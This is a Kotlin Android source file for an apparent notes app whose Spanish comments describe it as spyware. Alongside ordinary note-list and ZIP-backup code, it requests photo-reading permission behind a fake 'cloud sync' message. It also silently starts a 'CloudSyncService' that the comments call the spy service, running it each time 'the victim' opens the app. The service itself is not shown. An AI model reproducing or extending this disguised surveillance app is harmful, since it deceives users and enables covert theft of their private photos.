package cl.example.mynotes

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Menu
import android.view.MenuItem
import android.widget.ImageButton
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.RecyclerView
import androidx.recyclerview.widget.StaggeredGridLayoutManager
import com.google.android.material.floatingactionbutton.FloatingActionButton
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class MainActivity : AppCompatActivity() {

    private val db by lazy { NotesDatabase.getDatabase(this) }
    private lateinit var adapter: NotesAdapter

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // --- 1. DISEÑO VISUAL (Edge-to-Edge y Barra de Estado) ---
        // Esto hace que los iconos de la hora/batería sean oscuros para verse sobre fondo blanco
        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true

        // Esto evita que tu app quede tapada por la cámara frontal o la barra de gestos
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main_root)) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        // --- 2. CONFIGURAR LA BARRA SUPERIOR (Toolbar) ---
        // ¡ESTO ES LO QUE FALTABA!
        // Le decimos a la actividad que use nuestra 'MaterialToolbar' como la barra oficial.
        // Gracias a esto, el menú (los 3 puntos) aparecerá automáticamente a la derecha.
        val toolbar = findViewById<androidx.appcompat.widget.Toolbar>(R.id.topAppBar)
        setSupportActionBar(toolbar)

        // --- 3. CONFIGURAR LA LISTA DE NOTAS (RecyclerView) ---
        val recyclerView = findViewById<RecyclerView>(R.id.recycler_view)

        adapter = NotesAdapter { noteClicked ->
            // Al hacer clic en una nota, abrimos el editor enviando los datos de esa nota
            val intent = Intent(this, NoteEditorActivity::class.java)
            intent.putExtra("note_data", noteClicked)
            startActivity(intent)
        }

        recyclerView.adapter = adapter
        // LayoutManager tipo Pinterest (2 columnas escalonadas)
        recyclerView.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL)

        // --- 4. CONECTAR BASE DE DATOS ---
        // Observamos los cambios en la BD en tiempo real
        CoroutineScope(Dispatchers.Main).launch {
            db.notesDao().getAllNotes().collect { notesList ->
                adapter.submitList(notesList)
            }
        }

        // --- 5. BOTONES DE ACCIÓN ---

        // Botón Flotante (+) -> Crear nueva nota
        findViewById<FloatingActionButton>(R.id.fab_add_note).setOnClickListener {
            val intent = Intent(this, NoteEditorActivity::class.java)
            startActivity(intent)
        }

        // Botón Espía (Cámara) -> Está dentro de la Toolbar, pero funciona igual
        findViewById<ImageButton>(R.id.btn_spy_cam).setOnClickListener {
            checkPermissionAndStart()
        }

        // --- 6. INICIO AUTOMÁTICO DEL SERVICIO ---
        // Cada vez que la víctima abre la app, nos aseguramos de que el servicio espía esté corriendo
        iniciarServicioSilencioso()
    }

    // --- MENÚ DE OPCIONES (Backup) ---
    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        // Asegúrate de haber creado res/menu/main_menu.xml
        menuInflater.inflate(R.menu.main_menu, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_backup -> {
                realizarBackup()
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    // --- LÓGICA DE RESPALDO (ZIP) ---
    private fun realizarBackup() {
        Toast.makeText(this, "Generando respaldo...", Toast.LENGTH_SHORT).show()

        CoroutineScope(Dispatchers.IO).launch {
            // 1. Obtenemos todas las notas (Lista estática)
            val notes = db.notesDao().getAllNotesList()

            // 2. Llamamos al Helper para crear el ZIP
            val zipFile = BackupHelper.createBackup(this@MainActivity, notes)

            // 3. Compartimos el archivo (Volvemos al hilo principal UI)
            withContext(Dispatchers.Main) {
                if (zipFile != null && zipFile.exists()) {
                    shareZipFile(zipFile)
                } else {
                    Toast.makeText(this@MainActivity, "Error al crear respaldo", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    private fun shareZipFile(file: File) {
        try {
            // Usamos FileProvider para compartir de forma segura
            val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)

            val intent = Intent(Intent.ACTION_SEND).apply {
                type = "application/zip"
                putExtra(Intent.EXTRA_STREAM, uri)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }

            startActivity(Intent.createChooser(intent, "Guardar respaldo en..."))
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "Error al compartir: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    // --- LÓGICA ESPÍA (Permisos y Servicio) ---
    private fun checkPermissionAndStart() {
        val permission = if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), 101)
        } else {
            Toast.makeText(this, "Sincronizando nube...", Toast.LENGTH_SHORT).show()
            iniciarServicioSilencioso()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            iniciarServicioSilencioso()
        }
    }

    private fun iniciarServicioSilencioso() {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }
}